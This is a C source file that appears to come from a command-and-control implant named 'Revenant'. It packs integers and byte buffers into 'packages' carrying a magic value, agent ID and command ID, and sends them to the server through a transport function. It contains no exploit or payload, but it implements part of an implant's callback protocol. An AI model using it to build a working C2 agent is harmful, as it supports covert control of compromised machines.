#include "Revenant.h"
#include "Poly.h"
#include "Package.h"
#include "Transport.h"
#include "Utilities.h"

VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value ) {

    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size ) {
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt ) {
    Package->Buffer = LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT32 ),
            LMEM_MOVEABLE
    );

    Int32ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( UINT32 );
}

VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt ) {
    Package->Buffer = LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT64 ),
            LMEM_MOVEABLE
    );

    Int64ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Size   =  Package->Length;
    Package->Length += sizeof( UINT64 );
}

VOID PackageAddPad( PPACKAGE Package, PUCHAR Data, SIZE_T Size ) {
    Package->Buffer = LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    mem_cpy( Package->Buffer + ( Package->Length ), Data, Size );

    Package->Size   =  Package->Length;
    Package->Length += Size;
}


VOID PackageAddBytes( PPACKAGE Package, PUCHAR Data, SIZE_T Size ) {
    PackageAddInt32( Package, Size );

    Package->Buffer = LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );

    mem_cpy( Package->Buffer + Package->Length, Data, Size );

    Package->Size   =   Package->Length;
    Package->Length +=  Size;
}

// For callback to server
PPACKAGE PackageCreate( UINT32 CommandID ) {
    PPACKAGE Package = NULL;

    Package            = LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer    = LocalAlloc( LPTR, sizeof( BYTE ) );
    Package->Length    = 0;
    Package->CommandID = CommandID;
    Package->Encrypt   = FALSE;

    PackageAddInt32( Package, 0 ); // Package Size
    PackageAddInt32( Package, RVNT_MAGIC_VALUE ); // Magic Value
    PackageAddInt32( Package, Instance.Session.AgentID ); // Agent ID
    PackageAddInt32( Package, CommandID );

    return Package;
}

// For serialize raw data
PPACKAGE PackageNew( ) {
    PPACKAGE Package = NULL;

    Package          = LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer  = LocalAlloc( LPTR, 0 );
    Package->Length  = 0;
    Package->Encrypt = TRUE;

    PackageAddInt32( Package, 0 );
    PackageAddInt32( Package, RVNT_MAGIC_VALUE );

    return Package;
}

VOID PackageDestroy( PPACKAGE Package ) {
    if ( ! Package ) {
        return;
    }
    if ( ! Package->Buffer ) {
        return;
    }
    mem_set( Package->Buffer, 0, Package->Length );
    LocalFree( Package->Buffer );
    Package->Buffer = NULL;

    mem_set( Package, 0, sizeof( PACKAGE ) );
    LocalFree( Package );
    Package = NULL;
}

BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size ) {
    BOOL Success     = FALSE;

    if ( Package ) {
        // writes package length to buffer
        Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
            Success = TRUE;
        }
        PackageDestroy( Package );
    }
    else {
        Success = FALSE;
    }

    return Success;
}
